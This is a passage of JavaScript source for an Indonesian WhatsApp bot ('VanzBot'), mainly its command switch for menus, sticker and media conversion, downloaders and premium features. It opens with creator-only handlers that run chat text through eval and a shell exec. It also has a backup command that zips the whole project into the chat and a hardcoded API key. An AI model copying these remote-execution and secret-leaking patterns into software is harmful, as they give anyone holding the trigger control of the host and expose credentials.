		console.log(color('[EVAL]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkoakwoak`))
		  const ev = (sul) => {
            var sat = JSON.stringify(sul, null, 2)
            var bang = util.format(sat)
            if (sat == undefined) {
              bang = util.format(sul)
            }
            return reply(bang)
          }
          try {
           reply(util.format(eval(`;(async () => { ${chats.slice(2)} })()`)))
          } catch (e) {
           reply(util.format(e))
          }
		} else if (chats.startsWith("$ ") && isCreator) {
        console.log(color('[EXEC]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkoakwoak`))
          exec(chats.slice(2), (err, stdout) => {
		    if (err) return reply(`${err}`)
		    if (stdout) reply(`${stdout}`)
		  })
        } else if (chats.startsWith("< ") && isCreator) {
	    console.log(color('[EVAL]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkaokwoak`))
		 try {
	       let evaled = await eval(chats.slice(2))
		   if (typeof evaled !== 'string') evaled = require("util").inspect(evaled)
			reply(`${evaled}`)
		 } catch (err) {
		   reply(`${err}`)
		 }
		}
		
		//Logs 2.0
		if (!isGroup && isCmd && !fromMe) {
		    console.log(`<================>`)
		    addBalance(sender, randomNomor(20), balance)
            console.log(chalk.black(chalk.bgGreen(!command ? '<\> MESSAGE </>' : '<\> COMMAND </>')), chalk.white(chalk.bgRed(isGroup ? pushname : 'Private Chat')) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(sender) + '\n' + chalk.blueBright('=> Cmd'), chalk.green(chats || body), chalk.black(chalk.bgWhite(jam)))
            console.log(`<================>`)
          }
          if (isGroup && isCmd && !fromMe) {
			addBalance(sender, randomNomor(20), balance)
			console.log(`<================>`)
			console.log(chalk.black(chalk.bgGreen('<\> COMMAND </>')), chalk.black(chalk.bgWhite(`Group`)), chalk.white(chalk.bgRed(groupName)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(groupId)  + '\n' + chalk.blueBright('=> Cmd'), chalk.green(chats), chalk.black(chalk.bgWhite(jam)))
			console.log(`<================>`)
		}

		switch(command) {
			// Main Menu
		    case 'menu':
                var teks = allmenu(conn, totalFitur, sender, prefix, pushname, isOwner, isCreator, isPremium, balance, limit, limitCount, glimit, gcount)
                var pppnya = await conn.profilePictureUrl(sender, "image").catch(() => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
                await loading()
                if (!q) return conn.sendMessage(from, { 
                  text: teks, contextInfo: {
                  	mentionedJid: parseMention(teks),
                  	externalAdReply: {
                  	  showAdAttribution: true,
                            title: `VanzBot`,
                            body: `6.0`,
                            mediaType: 1,
                            thumbnailUrl: pppnya,
                            renderLargerThumbnail: true
                          }
                        }
                      })
                if (q === 'main') {
                    var main = menumain(prefix)
			        menulist(main)
                } else if (q === 'conver') {
                    var conver = menuconver(prefix)
			        menulist(conver)
                } else if (q === 'tools') {
                    var tools = menutools(prefix)
			        menulist(tools)
                } else if (q === 'stiker') {
                    var ssss = menustiker(prefix)
			        menulist(ssss)
                } else if (q === 'ai') {
                    var ai = menuai(prefix)
			        menulist(ai)
                } else if (q === 'download') {
                    var down = menudownload(prefix)
			        menulist(down)
                } else if (q === 'game') {
                    var gem = menugame(prefix)
			        menulist(gem)
                } else if (q === 'anonymous') {
                    var anon = menuanon(prefix)
			        menulist(anon)
                } else if (q === 'random') {
                    var lahh = menurandom(prefix)
			        menulist(lahh)
			    } else if (q === 'bug') {
                    var bag = menubug(prefix)
			        menulist(bag)
                } else if (q === 'photooxy') {
                    var pro = menupo(prefix)
			        menulist(pro)
                } else if (q === 'religion') {
                    var ilam = menureligion(prefix)
			        menulist(ilam)
                } else if (q === 'payment') {
                    var pay = menupb(prefix)
			        menulist(pay)
                } else if (q === 'group') {
                    var group = menugrup(prefix)
			        menulist(group)
                } else if (q === 'owner') {
                    var ownerr = menuowner(prefix)
			        menulist(ownerr)
                } else if (q === 'all') {
                    var alltod = menuall(conn, totalFitur, sender, prefix, pushname, isOwner, isCreator, isPremium, balance, limit, limitCount, glimit, gcount)
			        conn.sendMessage(from, { 
                       text: alltod, contextInfo: {
                     	mentionedJid: parseMention(alltod),
                     	externalAdReply: {
                      	  showAdAttribution: true,
                            title: `VanzBot`,
                            body: `all menu`,
                            mediaType: 289,
                            thumbnailUrl: pppnya,
                            renderLargerThumbnail: true }}})
                }
            break
            case 'totalfitur':
            case 'fitur': 
            reply(`Total Bot Features Are ${totalFitur()}`)
            break
			case 'rules':
			    var teks = `Peraturan Penggunaan Bot :
- Dilarang Spam
- Dilarang Menelpon Bot
- Dilarang Mengirim Virus Ke Bot

Catatan :
Semua Fitur Bot Di Lakukan Secara Otomatis Oleh Sistem Tanpa
Ada Campur Tangan Owner, 
Dan Semua Informasimu Seperti Chat, Foto, Video Atau Vn 
Akan Aman Tanpa Di Sebar, Dan Jika Ada Balasan Yang Absurd Atau
Sticker Absurd Ya Mungkin Owner Lagi Gabut Dan Butuh Temen Chat :v`
                conn.sendMessage(from, { caption: teks, image: fs.readFileSync('./media/bg1.jpg') })
			    break
			case 'botinfo':
			case 'infobot':
                   var capt = `_*${botName} Information*_

*• Name :* ${botName}
*• Number :* ${botNumber.split("@")[0]}
*• Creator :* ${creatorNumber.split("@")[0]}
*• Total Pengguna :* ${pendaftar.length}
*• Baileys :* @whiskeysockets/baileys
*• Baileys Ver. :* 6.5.0
*• Prefix :* Multi Prefix
*• Instagram :* ${hmm.ig}
*• YouTube :* ${hmm.yt}`
                   conn.sendMessage(from, { caption: capt, image: fs.readFileSync('./media/bg.jpg'), mentions: [creatorNumber] })
                break
			case 'runtime':
			    reply(`${botName} aktif selama ${runtime(process.uptime())}`)
			    break
			case 'idgc':
			    reply(`${from}`)
			    break
			case 'p':
			    reply(`apa`)
			    break
			case 'tqto':
                reply(`*Terima Kasih Kepada*\n\n>| 1. Vanz? ( Author )\n>| 2. LoL Human ( Rest APIs )\n>| 2. Zeltoria ( Rest APIs )\n>| 3. X-Code Api ( Rest APIs )\n>| 4. Penyedia Module\n>| 5. Subscriber & Creator Bot WhatsApp\n\n\n\n\n\n Powered By Vanz?`)
                break
			case 'speed':
               let timestamp = speed();
               let latensi = speed() - timestamp
               reply(`${latensi.toFixed(4)} Second`)
               break
			case 'donate':
			case 'donasi':
			    reply(`──「 MENU DONATE 」──\n\nHi ${pushname} 👋🏻\n\`\`\`DANA : ${setting.donasi.dana}\`\`\`\n\`\`\`GOPAY : ${setting.donasi.gopay}\`\`\`\nTerimakasih untuk kamu yang sudah donasi untuk perkembangan bot ini _^\n──「 THX FOR YOU ! 」──`)
			    break
            case 'owner':
            case 'creator': {
                conn.sendMessage(from, {
                    contacts: {
                        displayName: `${list.length} Kontak`,
                        contacts: list
                    }
                }, {
                    quoted: msg
                })
            }
            break
			case 'report':
			     var teks = `${q}`
			      conn.sendMessage(creatorNumber, {
                   text: teks
                }, { 
                    quoted: msg 
                })
				break
			case 'cekprem':
            case 'cekpremium':
                if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}daftarprem* untuk membeli premium`)
                if (isOwner) return reply(`Lu owner bego!`)
                if (isCreator) return reply(`Lu Creator!`)
                if (_prem.getPremiumExpired(sender, premium) == "PERMANENT") return reply(`PERMANENT`)
                let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
                let premiumnya = `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
                reply(premiumnya)
                break
            case 'listprem':
                let txt = `List Prem\nJumlah : ${premium.length}\n\n`
                let men = [];
                for (let i of premium) {
                    men.push(i.id)
                    txt += `*ID :* @${i.id.split("@")[0]}\n`
                  if (i.expired === 'PERMANENT') {
                    let cekvip = 'PERMANENT'
                    txt += `*Expire :* PERMANENT\n\n`
                  } else {
                    let cekvip = ms(i.expired - Date.now())
                    txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
                  }
                }
                mentions(txt, men, true)
                break
	        // Converter & Tools Menu
			case 'sticker': case 'stiker': case 's':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
				if (isImage || isQuotedImage) {
		           var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
			       var buffer = Buffer.from([])
			       for await(const chunk of stream) {
			          buffer = Buffer.concat([buffer, chunk])
			       }
			       var rand1 = 'sticker/'+getRandom('.jpg')
			       var rand2 = 'sticker/'+getRandom('.webp')
			       fs.writeFileSync(`./${rand1}`, buffer)
			       ffmpeg(`./${rand1}`)
				.on("error", console.error)
				.on("end", () => {
				  exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
				    conn.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
				    limitAdd(sender, limit)
					fs.unlinkSync(`./${rand1}`)
			            fs.unlinkSync(`./${rand2}`)
			          })
				 })
				.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
				.toFormat('webp')
				.save(`${rand2}`)
			    } else if (isVideo || isQuotedVideo) {
				 var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
				 var buffer = Buffer.from([])
				 for await(const chunk of stream) {
				   buffer = Buffer.concat([buffer, chunk])
				 }
			     var rand1 = 'sticker/'+getRandom('.mp4')
				 var rand2 = 'sticker/'+getRandom('.webp')
			         fs.writeFileSync(`./${rand1}`, buffer)
			         ffmpeg(`./${rand1}`)
				  .on("error", console.error)
				  .on("end", () => {
				    exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
				      conn.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
				      limitAdd(sender, limit)
					  fs.unlinkSync(`./${rand1}`)
				      fs.unlinkSync(`./${rand2}`)
				    })
				  })
				 .addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
				 .toFormat('webp')
				 .save(`${rand2}`)
                } else {
			       reply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`)
			    }
                break
			case 'toimg': case 'toimage':
            case 'tovid': case 'tovideo':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!isQuotedSticker) return reply(`Reply stikernya!`)
                var stream = await downloadContentFromMessage(msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
                var buffer = Buffer.from([])
                for await(const chunk of stream) {
                   buffer = Buffer.concat([buffer, chunk])
                }
                var rand1 = 'sticker/'+getRandom('.webp')
                var rand2 = 'sticker/'+getRandom('.png')
                fs.writeFileSync(`./${rand1}`, buffer)
                if (isQuotedSticker && msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated !== true) {
                reply(mess.wait)
                exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
                   fs.unlinkSync(`./${rand1}`)
                   if (err) return reply(mess.error.api)
                   conn.sendMessage(from, { image: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
                   limitAdd(sender, limit)
                   fs.unlinkSync(`./${rand2}`)
                 })
                 } else {
                    reply(mess.wait)
                    webp2mp4File(`./${rand1}`).then(async(data) => {
                    fs.unlinkSync(`./${rand1}`)
                    conn.sendMessage(from, { video: await getBuffer(data.data) }, { quoted: msg })
                    limitAdd(sender, limit)
                  })
                }
                break
            case 'tomp3': case 'toaudio':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (isVideo || isQuotedVideo) {
                     let media = await downloadAndSaveMediaMessage(msg, 'video', `./sticker/${Date.now()}.mp4`)
                     reply(mess.wait)
                     let ran = './sticker/'+getRandom('.mp3')
                     exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
                       fs.unlinkSync(media)
                       if (err) { fs.unlinkSync(ran); return reply('Gagal :V') }
                       conn.sendMessage(from, { audio: fs.readFileSync(ran),  mimetype: 'audio/mp4', fileName: `${sender.split("@")[0]}ToMp3`, ptt: args[1] == '--ptt' ? true : false }, { quoted: msg })
                       limitAdd(sender, limit)
                       fs.unlinkSync(ran)
                     })
                   } else {
                     reply(`Kirim/reply video dengan caption ${command} atau ${command} --ptt`)
                   }
                   break
             case 'ttp':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah *${prefix}ttp* teks`)
                   if (q.length > 75) return reply(`Teksnya kepanjangan`)
                   conn.sendMessage(from, wait)
await sleep(200)
                   getBuffer(`https://aemt.me/ttp?text=${q}`)
                   .then( res => {
                     if (res == undefined) return reply(mess.error.api)
                     conn.sendImageAsSticker(from, res, msg, { packname, author })
                     limitAdd(sender, limit)
                   }).catch(() => reply(mess.error.api))
                   break
             case 'attp':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah *${prefix}ttp* teks`)
                   if (q.length > 75) return reply(`Teksnya kepanjangan`)
                   conn.sendMessage(from, wait)
await sleep(200)
                   getBuffer(`https://aemt.me/attp?text=${q}`)
                   .then( res => {
                     if (res == undefined) return reply(mess.error.api)
                     conn.sendVideoAsSticker(from, res, msg, { packname, author })
                     limitAdd(sender, limit)
                   }).catch(() => reply(mess.error.api))
                   break
            case 'anticolong':
            case 'smeta':
            case 'stickermeta': {
                   if (isImage || isQuotedImage) {
                     var media = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender}.jpeg`)
                     var { addExif } = require('../lib/exif3')
                     var stick = await addExif(media, packname || '', author || 'Vanz Ganteng');
                  let encmedia = await conn.sendMessage(from, { sticker: stick }, { quoted: msg });
               }
            }
            break
            case 'swm': case 'wm': case 'take': case 'takestiker':
                case 'stikerwm': case 'stickerwm': case 'takesticker':
                   if (!isPremium && !isCreator && !isOwner) return reply(mess.OnlyPrem)
                   var pname = q.split('|')[0] ? q.split('|')[0] : 'water'
                   var athor = q.split('|')[1] ? q.split('|')[1] : 'mark'
                   if (isImage || isQuotedImage) {
                     if (args.length < 2) return reply(`Penggunaan ${command} nama|author`)
                     var media = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender}.jpeg`)
                     var opt = { packname: pname, author: athor }
                     conn.sendImageAsSticker(from, media, msg, opt)
                     .then( res => {
                     fs.unlinkSync(media)
                     }).catch((e) => reply(mess.error.api))
                   } else if (isVideo || isQuotedVideo) {
                     if (args.length < 2) return reply(`Penggunaan ${command} nama|author`)
                     conn.sendMessage(from, wait)
await sleep(100)
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender}.jpeg`)
                     var opt = { packname: pname, author: athor }
                     conn.sendImageAsSticker(from, media, msg, opt)
                     .then( res => {
                       fs.unlinkSync(media)
                     }).catch((e) => reply(mess.error.api))
                   } else if (isQuotedSticker) {
                     if (args.length < 2) return reply(`Penggunaan ${command} nama|author`)
                     conn.sendMessage(from, wait)
await sleep(100)
                     var media = quotedMsg['stickerMessage'].isAnimated !== true ? await downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${sender}.jpeg`) : await downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${sender}.webp`)
                     media = quotedMsg['stickerMessage'].isAnimated !== true ? media : (await webp2mp4File(media)).data
                     var opt = { packname: pname, author: athor }
                     quotedMsg['stickerMessage'].isAnimated !== true ?
                      conn.sendImageAsSticker(from, media, msg, opt)
                       .then( res => { fs.unlinkSync(media) }).catch((e) => reply(mess.error.api))
                       : conn.sendVideoAsSticker(from, media, msg, opt)
                        .then( res => { fs.unlinkSync(`./sticker/${sender}.webp`) }).catch((e) => reply(mess.error.api))
                   } else {
                     reply(`Kirim/Balas gambar/video/sticker dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
                   }
                   break
            case 'smeta': 
            case 'anticolong': 
                   if (!isPremium && !isCreator && !isOwner) return reply(mess.OnlyPrem)
                   if (isQuotedSticker) {                 
                     conn.sendMessage(from, wait)
await sleep(100)
                     var media = quotedMsg['stickerMessage'].isAnimated !== true ? await downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${sender}.jpeg`) : await downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${sender}.webp`)
                     media = quotedMsg['stickerMessage'].isAnimated !== true ? media : (await webp2mp4File(media)).data
                     var opt = { packname: `Anti Colong`, author: `By Vanz` }
                     quotedMsg['stickerMessage'].isAnimated !== true ?
                      conn.sendStickermeta(from, media, msg, opt)
                       .then( res => { fs.unlinkSync(media) }).catch((e) => reply(mess.error.api))
                       : conn.sendVideoStickerMeta(from, media, msg, opt)
                        .then( res => { fs.unlinkSync(`./sticker/${sender}.webp`) }).catch((e) => reply(mess.error.api))
                   } else {
                     reply(`Kirim/Balas gambar/video/sticker dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
                   }
                   break
            case 'smeme': {
                if (args.length < 2) return reply(`Kirim perintah ${command} teks atas|teks bawah`)
                 conn.sendMessage(from, wait)
await sleep(200)
                var media = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender+Date.now()}.jpg`)
                var atas = q.split('|')[0] ? q.split('|')[0] : '-'
                var bawah = q.split('|')[1] ? q.split('|')[1] : '-'
                let fatGans = await TelegraPh(media)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans}`
                let pop = await conn.sendImageAsSticker(from, smeme, msg, {
                        packname: packname,
                        author: author
                    })
                     fs.unlinkSync(pop)
                 }
                 break
            case 'upload': case 'tourl': case 'tolink':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   } else if (isVideo || isQuotedVideo) {
                     var fileName = 'video'+makeid(10)+'.mp4'
                     var media = await downloadAndSaveMediaMessage(msg, 'video', `./sticker/${fileName}`)
                   } else if (isQuotedAudio) {
                     var fileName = 'audio'+makeid(10)+'.mp3'
                     var media = await downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${fileName}`)
                   } else {
                     return reply(`Kirim atau balas Sticker/Foto/Video/Audio yang ingin dijadikan url dengan caption ${command}`)
                   }
                   if (media !== null) {
                     conn.sendMessage(from, wait)
await sleep(600)
                     var data = await TelegraPh(media)
                     var teks = `*UPLOAD SUCCES*\n\n*Url :* ${util.format(data)}\n*Expired :* No expired`
                     reply(teks)
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply(mess.error.api)
                     fs.unlinkSync(media)
                   }
                   break
            case 'backup':
                if (!isCreator) return reply(mess.OnlyOwner)
                conn.sendMessage(from, wait)
await sleep(600)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await conn.sendMessage(from, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: msg
                })
                break
            case 'emojimix': case 'mixemoji':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} emoji1+emoji2\ncontoh : ${command} 😜+😅`)
                   if (!q.includes('+')) return reply(`Format salah, contoh pemakaian ${command} 😅+??`)
                   var emo1 = q.split("+")[0]
                   var emo2 = q.split("+")[1]
                   if (!isEmoji(emo1) || !isEmoji(emo2)) return reply(`Itu bukan emoji!`)
                   fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emo1)}_${encodeURIComponent(emo2)}`)
                   .then(data => {
                     sendStickerFromUrl(from, data.results[0]. url, packname, author, { quoted: msg })
                     limitAdd(sender, limit)
                   }).catch((e) => reply(mess.error.api))
                   break
             case 'say':
                  if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                  if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
                  conn.sendMessage(from, wait)
await sleep(200)
                  var req = await (await fetch(`https://api.xcodeteam.xyz/api/converter/text-to-speech?api_key=${setting.apikey.xcode}&language=id-ID&text=${q}`)).json()
                  var { code } = req
                  if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                  var { audio_url } = req.data
                  conn.sendMessage(from, { audio: { url: audio_url }, mimetype: 'audio/mpeg', ptt: true }, { quoted: {key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `${pushname}` } : {}) }, message: { conversation: `Text-to-speech | Indonesia` }}})
                  limitAdd(sender, limit)
                  break
             case 'qc':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var teks = quotedMsg ? quotedMsg.chats : q ? q : ''
                   if (!teks) return reply(`Kirim perintah *${prefix}qc* teks`)
                     let jsonnya = {
                       type: "quoted",
                       format: "webp",
                       backgroundColor: "#FFFFFF",
                       width: 512,
                       height: 768,
                       scale: 2,
                       messages: [
                         {
                         entities: [],
                         avatar: true,
                         from: {
                           id: 1,
                           name: conn.getName(quotedMsg ? quotedMsg.sender : sender),
                           photo: {
                             url: await conn.profilePictureUrl(quotedMsg ? quotedMsg.sender : sender, "image").catch(() => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg'),
                           }
                           },
                           text: teks,
                           replyMessage: {},
                           },
                           ],
                           }
                           const post = await axios.post("https://bot.lyo.su/quote/generate",
                           jsonnya,{
                             headers: { "Content-Type": "application/json"},
                           })
                         let buff = await Buffer.from(post.data.result.image, "base64")
                       conn.sendImageAsSticker(from, buff, msg, { packname, author })
                   limitAdd(sender, limit)
                   break             
                case 'openai1': case 'ai1':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} promt`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/artificial-intelligence/chatgpt-3?api_key=${setting.apikey.xcode}&question=${q}&custom_question=Test&custom_answer=Test%20success`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   reply(req.data.answer)
                   limitAdd(sender, limit)
                   break
            case 'brainly': {
                if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} question`)
                let d = await fetchJson(`https://api.lolhuman.xyz/api/brainly?apikey=${setting.apikey.lol}&query=${q}`)       
                await arxzy.sendMessage(from, {
                    text: d.result
                }, { quoted: msg })
            }
            break
	        // Downloader Menu
	        case 'tiktokaudio':
	        case 'ttaudio':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                   if (!isUrl(args[1])) return reply(mess.error.Iv)
                   if (!args[1].includes('tiktok')) return reply(mess.error.Iv)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/downloader/tiktok?api_key=${apikey.xcode}&video_url=${args[1]}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { music } = req.data
                   conn.sendMessage(from, { audio: { url: music }, mimetype: 'audio/mp4' }, { quoted: msg })
                   limitAdd(sender, limit)
                   break
            case 'tiktokvideo':
            case 'ttvideo':
            case 'tiktok':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                   if (!isUrl(args[1])) return reply(mess.error.Iv)
                   if (!args[1].includes('tiktok')) return reply(mess.error.Iv)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/downloader/tiktok?api_key=${apikey.xcode}&video_url=${args[1]}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { play, description } = req.data
                   conn.sendMessage(from, { video: { url: play }, caption: description }, { quoted: msg })
                   limitAdd(sender, limit)
                   break
            case 'instagram':
            case 'igreels':
            case 'igphotos':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                   if (!isUrl(args[1])) return reply(mess.error.Iv)
                   if (!args[1].includes('instagram')) return reply(mess.error.Iv)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/downloader/instagram?api_key=${setting.apikey.xcode}&target_url=${args[1]}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   for (let i of req.data) {
                       if (i.url.includes('.jpg')) {
                         conn.sendMessage(from, { image: { url: i.url }}, { quoted: msg })
                       } else conn.sendMessage(from, { video: { url: i.url }}, { quoted: msg })
                   }
                   limitAdd(sender, limit)
                   break       
            case 'ins':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                   reply(mess.wait)
                   var req = await (await fetch(`https://zeltoria.site/api/tools/ssweb?url=${q}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   for (let i of req.data) {
                       if (i.url.includes('.png')) {
                         conn.sendMessage(from, { image: { url: i.url }}, { quoted: msg })
                       } else conn.sendMessage(from, { video: { url: i.url }}, { quoted: msg })
                   }
                   limitAdd(sender, limit)
                   break
              case 'play':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} query`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.zahwazein.xyz/downloader/ytplay?apikey=${apikey.zein}&query=${q}`)).json()
                   var { title, url, thumbnail, duration, getAudio, source } = req.result
                   var aon = await (await fetch(`https://aemt.me/download/ytdl?url=${url}`)).json()
              var { mp3 } = aon.result
                   var teks = `*Y O U T U B E  P L A Y*\n\n`
                   teks += `• *Title :* ${title}\n`
                   teks += `• *Source :* ${source}\n`
                   teks += `• *Durasi :* ${duration}\n`
                   teks += `• *url :* ${url}`
                   teks += `\n\nMohon Menunggu`
                   conn.sendMessage(from, {
                   	text: teks,
                        contextInfo: {
                           externalAdReply: {
                               title: title,
                               body: botName,
                               thumbnailUrl: thumbnail,
                               mediaType: 2,   
                               mediaUrl: url,
                               renderLargerThumbnail: true
                             }
                           }
                         }, { quoted: msg })
                   conn.sendMessage(from, {
                   	audio: {
                   	    url: mp3 },
                       mimetype: 'audio/mp3', 
                       ptt: true,
                        contextInfo: {
                           externalAdReply: {
                               title: title,
                               body: botName,
                               thumbnailUrl: thumbnail,
                               mediaType: 2,   
                               mediaUrl: url,                              
                               renderLargerThumbnail: true
                             }
                           }
                         }, { 
                            quoted: msg 
                        }).catch(() => replay(`server apikey mati`))
                   limitAdd(sender, limit)
                   break
             case 'ytmp4':
             case 'mp4':
                   if (!isPremium && !isOwner && !isCreator) return reply(mess.OnlyPrem)
                   if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                   if (!isUrl(args[1])) return reply(mess.error.Iv)
                   if (!args[1].includes('youtube')) return reply(mess.error.Iv)
                   conn.sendMessage(from, wait)
await sleep(600)
